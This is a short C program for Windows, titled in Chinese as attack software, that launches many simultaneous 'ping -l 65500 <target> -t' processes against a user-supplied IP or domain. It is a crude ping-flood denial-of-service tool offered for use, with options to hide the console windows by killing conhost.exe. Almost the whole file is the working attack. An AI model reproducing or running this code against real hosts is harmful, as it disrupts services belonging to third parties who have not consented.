/*
	Name: attack 攻击软件
	Copyright:
	Author: 折竹
	Date: 05/03/19 08:40
	Description:
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
int main(int argc, char** argv)
{
	char str[64];
	int n = 0, i = 0;
	//如果输入字符串只有一个attack一个话
	if (argc == 1)
		//输入参数错误
	{
		printf("错误,没有使用参数！");
		exit(1);
	}
	if (strcmp(argv[1], "help") == 0)
	{
		printf("使用参数参数方式如下  [-ip] [-n] [-help] [-shutdown] [-nowshow]\n");
		printf("例如attack 192.168.0.1 10\n");
		printf("ip表示ip地址或者网站域名如：www.baidu.com\n");
		printf("attack help 显示帮助\n");
		printf("attack shutdown 表示关闭运行的进程\n");
		printf("attack ip n notshow不显示控制台窗口");
		exit(0);

	}
	if (strcmp(argv[1], "shutdown") == 0)
	{
		system("start taskkill /f /im conhost.exe");
		system("start taskkill /f /im ping.exe");
		printf_s("conhost.exe 与 ping.exe成功关闭\n");
	}
	if (argc >= 3)
	{
		sprintf_s(str, "start ping -l 65500 %s -t", argv[1]);
		n = atoi(argv[2]);
		do {
			system(str);
			i++;
		} while (i < n);
		if (strcmp(argv[3], "notshow") == 0)
		{
			system("start taskkill /f /im conhost.exe");
		}
	}
	return 0;
}